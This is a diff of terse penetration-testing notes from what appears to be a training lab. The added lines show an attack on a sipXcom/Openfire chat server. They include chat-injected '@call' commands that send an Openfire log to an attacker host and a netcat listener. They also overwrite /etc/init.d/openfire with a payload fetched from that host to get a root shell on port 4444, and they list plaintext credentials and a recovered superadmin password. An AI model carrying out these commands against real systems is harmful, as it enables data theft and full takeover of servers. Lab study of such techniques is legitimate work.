@@ -783,9 +783,12 @@ passwd=ChangeMePlease__XMPPTest
 username=j.jones
 userid=j.jones
 passwd=ChangeMePlease__XMPPTest
+
+# get superadmin, then download openfire.txt
+@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET [http://192.168.45.214/openfire.txt](http://192.168.45.214/openfire.txt "http://192.168.45.214/openfire.txt") -o /tmp/dummy
 ```
 
-```
+
 .223 (milan) (standalone)
 ```bash
 nmap 192.168.213.223
@@ -931,12 +934,6 @@ sudo proxychains nmap -sT -A 172.16.124.32
 
 ```
 
-.30
-```bash
-# port 22, 3190
-
-```
-
 .32
 ```bash
 # port 80
@@ -945,6 +942,27 @@ sudo proxychains nmap -sT -A -p 80 172.16.124.32
 https://172.16.124.32/sipxconfig/app
 
 # access webpage by setting firefox proxy to HTTP 192.168.194.224 3128 and nothing for socks
+
+userid=j.jameson
+passwd=ChangeMePlease__XMPPTest
+
+# input this into the chat and catch the logfile with netcat listener on port 80
+@call abc -o/tmp/test123 -d @/opt/openfire/logs/sipxopenfire-im.log http://192.168.45.229/test.txt
+
+# retrieve superadmin password
+2008_EndlessConversation
+
+# modify the exploit from https://seclists.org/fulldisclosure/2023/Mar/5 then serve it up from a webserver
+@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://192.168.45.229/openfire -o /tmp/dummy
+# from the UI restart the im service
+# shell is caught on 4444 as root
+
+```
+
+.30
+```bash
+# port 22, 3190
+
 ```
 
 .225 (singapore) (standalone)
